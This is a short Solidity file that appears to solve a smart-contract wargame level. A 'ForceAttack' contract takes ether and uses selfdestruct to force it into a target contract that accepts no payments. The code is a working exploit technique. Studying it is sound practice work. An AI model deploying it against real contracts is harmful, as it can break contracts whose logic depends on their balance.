pragma solidity ^0.6.6;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract Force {}

contract ForceAttack {
    constructor() public payable {}

    fallback() external payable {}

    function attack(address payable target) public {
        selfdestruct(target);
    }
}
